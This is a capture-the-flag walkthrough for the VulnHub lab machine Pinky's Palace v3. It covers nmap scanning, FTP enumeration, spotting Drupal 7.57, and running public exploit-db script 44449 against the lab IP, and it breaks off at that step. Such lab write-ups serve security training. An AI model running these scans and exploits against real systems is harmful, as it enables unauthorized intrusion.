::::::::::::::: page
# Pinky\'s Palace: v3 {#pinkys-palace-v3 .title}

\

## 

## Pinky\'s Palace: v3

- **[Pinky\'s Palace: v3]{style="color:#cdab8f;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/pinkys-palace-v3,237/>

![](831-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#986a44;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](831-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.187
:::

![](831-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.187
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.187
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 8000 -sT -sV -A --script=http-enum.nse 192.168.2.187
:::

![](831-4.png)

1.  [FTP Enumeration]{style="color:#986a44;"} :

- FTP login :

::: codebox
    ftp 192.168.2.187
:::

![](831-5.png)

- Check file list :

::: codebox
    ls
:::

- Download the file :

::: codebox
    get WELCOME
:::

![](831-6.png)

- Read the file :

::: codebox
    cat WELCOME
:::

![](831-7.png)

1.  [Web Enumeration]{style="color:#986a44;"} :

- IP browse : <http://192.168.2.187:8000/>
  <http://192.168.2.187:8000/CHANGELOG.txt>

![](831-8.png)

- Search the exploit :

::: codebox
    searchsploit drupal 7.57 
:::

![](831-9.png)

- Find the exploit in exploitdb :

::: codebox
    https://www.exploit-db.com/exploits/44449
:::

![](831-10.png) download the file .

- Execute the drupal file :

::: codebox
    ruby 44449.rb 192.168.2.187:8000
:::

![](831-11.png)
:::::::::::::::
